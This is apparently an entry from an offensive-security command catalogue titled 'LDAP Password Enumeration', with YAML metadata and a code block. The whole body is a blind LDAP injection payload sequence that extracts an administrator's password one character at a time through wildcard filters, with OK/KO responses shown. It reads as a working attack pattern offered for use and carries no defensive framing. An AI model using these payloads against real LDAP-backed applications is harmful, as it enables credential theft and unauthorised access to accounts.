---
id: 3a71a035-c9a2-4340-bfcf-58f3be1f5763
name: LDAP Password Enumeration
type: command
executor: bash
data: '(&(sn=administrator)(password=*))    : OK

  (&(sn=administrator)(password=A*))   : KO

  (&(sn=administrator)(password=B*))   : KO

  ...

  (&(sn=administrator)(password=M*))   : OK

  (&(sn=administrator)(password=MA*))  : KO

  (&(sn=administrator)(password=MB*))  : KO

  ...

  (&(sn=administrator)(password=MY*))  : OK

  (&(sn=administrator)(password=MYA*)) : KO

  (&(sn=administrator)(password=MYB*)) : KO

  (&(sn=administrator)(password=MYC*)) : KO

  ...

  (&(sn=administrator)(password=MYK*)) : OK

  (&(sn=administrator)(password=MYKE)) : OK'
output: null
created_at: '2023-04-06T03:56:01.631504+00:00'
updated_at: '2023-04-10T20:36:28.745514+00:00'
---

# LDAP Password Enumeration

```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```


